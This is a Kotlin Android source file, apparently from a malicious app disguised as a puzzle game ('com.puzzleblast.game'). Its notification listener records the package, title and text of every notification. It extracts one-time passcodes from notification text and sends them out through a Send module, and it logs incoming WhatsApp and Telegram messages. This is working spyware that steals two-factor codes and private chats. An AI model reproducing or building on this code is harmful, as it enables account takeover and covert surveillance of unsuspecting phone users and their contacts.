package com.puzzleblast.game.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.modules.NotifModule
import com.puzzleblast.game.modules.OtpModule
import com.puzzleblast.game.util.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class NotificationListener : NotificationListenerService() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val title = sbn.notification?.extras?.getCharSequence("android.title")?.toString() ?: ""
        val text = sbn.notification?.extras?.getCharSequence("android.text")?.toString() ?: ""
        val time = sbn.postTime
        NotifModule.buffer.add(NotifModule.NotifEntry(pkg, title, text, time))
        if (NotifModule.buffer.size > 500) NotifModule.buffer.removeAt(0)
        val otp = OtpModule.extractOtp(text) ?: OtpModule.extractOtp(title)
        if (otp != null) {
            scope.launch {
                Send.text("🔑 OTP · $pkg\n$title\n$text\n🔑[$otp]")
            }
        }
        if (pkg in listOf("com.whatsapp", "com.whatsapp.w4b", "org.telegram.messenger")) {
            com.puzzleblast.game.modules.ChatExtractModule.log(pkg, title, text, time)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
}
